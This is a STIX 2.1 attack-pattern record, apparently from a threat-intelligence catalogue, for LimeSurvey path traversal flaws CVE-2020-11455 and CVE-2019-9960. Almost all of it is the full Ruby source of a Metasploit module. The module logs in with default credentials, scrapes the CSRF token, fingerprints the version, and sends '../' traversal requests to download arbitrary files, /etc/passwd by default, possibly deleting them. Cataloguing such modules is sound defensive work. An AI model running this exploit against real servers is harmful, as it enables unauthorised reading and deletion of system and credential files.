{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e8b9acae-3aa7-4d1b-ab67-bb7abf078975",
    "created": "2024-08-14T16:28:43.351692Z",
    "modified": "2024-08-14T16:28:43.351695Z",
    "name": "LimeSurvey Zip Path Traversals",
    "description": " This module exploits an authenticated path traversal vulnerability found in LimeSurvey",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/limesurvey_zip_traversals.rb",
            "external_id": "limesurvey_zip_traversals.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-11455"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/LimeSurvey/LimeSurvey/commit/daf50ebb16574badfb7ae0b8526ddc5871378f1b"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-9960"
        },
        {
            "source_name": "reference",
            "url": "https://www.secsignal.org/en/news/cve-2019-9960-arbitrary-file-download-in-limesurvey/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/LimeSurvey/LimeSurvey/commit/1ed10d3c423187712b8f6a8cb2bc9d5cc3b2deb8"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'LimeSurvey Zip Path Traversals',\n        'Description' => %q{\n          This module exploits an authenticated path traversal vulnerability found in LimeSurvey\n          versions between 4.0 and 4.1.11 with CVE-2020-11455 or <= 3.15.9 with CVE-2019-9960,\n          inclusive.\n          In CVE-2020-11455 the getZipFile function within the filemanager functionality\n          allows for arbitrary file download.  The file retrieved may be deleted after viewing,\n          which was confirmed in testing.\n          In CVE-2019-9960 the szip function within the downloadZip functionality allows\n          for arbitrary file download.\n          Verified against 4.1.11-200316, 3.15.0-181008, 3.9.0-180604, 3.6.0-180328,\n          3.0.0-171222, and 2.70.0-170921.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Matthew Aberegg', # edb/discovery cve 2020\n          'Michael Burkey', # edb/discovery cve 2020\n          'Federico Fernandez', # cve 2019\n          'Alejandro Parodi' # credited in cve 2019 writeup\n        ],\n        'References' => [\n          # CVE-2020-11455\n          ['EDB', '48297'], # CVE-2020-11455\n          ['CVE', '2020-11455'],\n          ['URL', 'https://github.com/LimeSurvey/LimeSurvey/commit/daf50ebb16574badfb7ae0b8526ddc5871378f1b'],\n          # CVE-2019-9960\n          ['CVE', '2019-9960'],\n          ['URL', 'https://www.secsignal.org/en/news/cve-2019-9960-arbitrary-file-download-in-limesurvey/'],\n          ['URL', 'https://github.com/LimeSurvey/LimeSurvey/commit/1ed10d3c423187712b8f6a8cb2bc9d5cc3b2deb8']\n        ],\n        'DisclosureDate' => '2020-04-02',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ]),\n        OptString.new('TARGETURI', [true, 'The base path to the LimeSurvey installation', '/']),\n        OptString.new('FILE', [true, 'The file to retrieve', '/etc/passwd']),\n        OptString.new('USERNAME', [true, 'LimeSurvey Username', 'admin']),\n        OptString.new('PASSWORD', [true, 'LimeSurvey Password', 'password'])\n      ]\n    )\n  end\n\n  def uri\n    target_uri.path\n  end\n\n  def cve_2020_11455(cookie, ip)\n    vprint_status('Attempting to retrieve file')\n    print_error 'This method will possibly delete the file retrieved!!!'\n    traversal = '../' * datastore['DEPTH']\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, 'index.php', 'admin', 'filemanager', 'sa', 'getZipFile'),\n      'cookie' => cookie,\n      'vars_get' => {\n        'path' => \"#{traversal}#{datastore['FILE']}\"\n      }\n    })\n    if res && res.code == 200 && !res.body.empty?\n      loot = store_loot('', 'text/plain', ip, res.body, datastore['FILE'], 'LimeSurvey Path Traversal')\n      print_good(\"File stored to: #{loot}\")\n    else\n      print_bad('File not found or server not vulnerable')\n    end\n  end\n\n  def cve_2019_9960_version_3(cookie, ip)\n    vprint_status('Attempting to retrieve file')\n    traversal = '../' * datastore['DEPTH']\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, 'index.php', 'admin', 'export', 'sa', 'downloadZip'),\n      'cookie' => cookie,\n      'vars_get' => {\n        'sZip' => \"#{traversal}#{datastore['FILE']}\"\n      }\n    })\n    if res && res.code == 200 && !res.body.empty?\n      loot = store_loot('', 'text/plain', ip, res.body, datastore['FILE'], 'LimeSurvey Path Traversal')\n      print_good(\"File stored to: #{loot}\")\n    else\n      print_bad('File not found or server not vulnerable')\n    end\n  end\n\n  # untested because I couldn't find when this applies.  It is pre 2.7 definitely, but unsure when.\n  # this URL scheme was noted in the secsignal write-up\n  def cve_2019_9960_pre25(cookie, ip)\n    vprint_status('Attempting to retrieve file')\n    traversal = '../' * datastore['DEPTH']\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, 'index.php'),\n      'cookie' => cookie,\n      'vars_get' => {\n        'sZip' => \"#{traversal}#{datastore['FILE']}\",\n        'r' => 'admin/export/sa/downloadZip'\n      }\n    })\n    if res && res.code == 200 && !res.body.empty?\n      loot = store_loot('', 'text/plain', ip, res.body, datastore['FILE'], 'LimeSurvey Path Traversal')\n      print_good(\"File stored to: #{loot}\")\n    else\n      print_bad('File not found or server not vulnerable')\n    end\n  end\n\n  def login\n    # get csrf\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, 'index.php', 'admin', 'authentication', 'sa', 'login')\n    })\n    cookie = res.get_cookies\n    fail_with(Failure::NoAccess, 'No response from server') unless res\n\n    # this regex is version 4+ compliant, will fail on earlier versions which aren't vulnerable anyways.\n    /\"csrfTokenName\":\"(?<csrf_name>\\w+)\"/i =~ res.body\n    /\"csrfToken\":\"(?<csrf_value>[\\w=-]+)\"/i =~ res.body\n    csrf_name = 'YII_CSRF_TOKEN' if csrf_name.blank? # default value\n    fail_with(Failure::NoAccess, 'Unable to get CSRF values, check URI and server parameters.') if csrf_value.blank?\n    vprint_status(\"CSRF: #{csrf_name} => #{csrf_value}\")\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, 'index.php', 'admin', 'authentication', 'sa', 'login'),\n      'cookie' => cookie,\n      'vars_post' => {\n        csrf_name => csrf_value,\n        'authMethod' => 'Authdb',\n        'user' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD'],\n        'loginlang' => 'default',\n        'action' => 'login',\n        'width' => '100',\n        'login_submit' => 'login'\n      }\n    })\n\n    if res && res.code == 302 && res.headers['Location'].include?('login') # good login goes to location admin/index not admin/authentication/sa/login\n      fail_with(Failure::NoAccess, 'No response from server')\n    end\n    vprint_good('Login Successful')\n    res.get_cookies\n  end\n\n  def determine_version(cookie)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, 'index.php', 'admin', 'index'),\n      'cookie' => cookie\n    })\n    fail_with(Failure::NoAccess, 'No response from server') unless res\n    /Version\\s+(?<version>\\d\\.\\d{1,2}\\.\\d{1,2})/ =~ res.body\n    return nil unless version\n\n    Rex::Version.new(version)\n  end\n\n  def run_host(ip)\n    cookie = login\n    version = determine_version cookie\n    if version.nil?\n      # try them all!!!\n      print_status('Unable to determine version, trying all exploits')\n      cve_2020_11455 cookie, ip\n      cve_2019_9960_3_15_9 cookie, ip\n      cve_2019_9960_pre3_15_9 cookie, ip\n    end\n    vprint_status \"Version Detected: #{version.version}\"\n    if version.between?(Rex::Version.new('4.0'), Rex::Version.new('4.1.11'))\n      cve_2020_11455 cookie, ip\n    elsif version.between?(Rex::Version.new('2.50.0'), Rex::Version.new('3.15.9'))\n      cve_2019_9960_version_3 cookie, ip\n    # 2.50 is when LimeSurvey started doing almost daily releases.  This version was\n    # picked arbitrarily as I can't seem to find a lower bounds on when this other\n    # method may be needed.\n    elsif version < Rex::Version.new('2.50.0')\n      cve_2019_9960_pre25 cookie, ip\n    else\n      print_bad \"No exploit for version #{version.version}\"\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-04-02"
}